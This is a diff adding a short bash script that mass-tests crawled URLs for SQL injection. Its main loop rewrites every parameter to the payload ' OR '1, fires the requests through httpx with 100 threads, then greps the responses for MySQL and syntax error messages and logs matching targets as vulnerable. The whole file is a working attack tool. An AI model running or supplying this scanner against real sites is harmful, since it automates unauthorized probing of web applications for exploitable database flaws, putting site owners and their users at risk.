@@ -1,0 +1,11 @@
+#!/bin/bash
+
+grep "=" COMBINED_CRWL | sed 's/=.*/=/' | sort -u | qsreplace "' OR '1" | httpx -silent -threads 100 -sr 
+cd output
+
+for filename in * ; do 
+    grep -q -is "syntax\|mysql" $filename 2>/dev/null && 
+    echo -e "TARGET \033[0;32mCould Be Exploitable\n\033[0m : $filename" && 
+    echo -e "\033[0;32mVulnerable : $filename \033[0m" >> ../RESULT_SQLINJECTION || 
+    echo -e "TARGET \033[0;31mNot Vulnerable\n\033[0m : $filename " 
+done
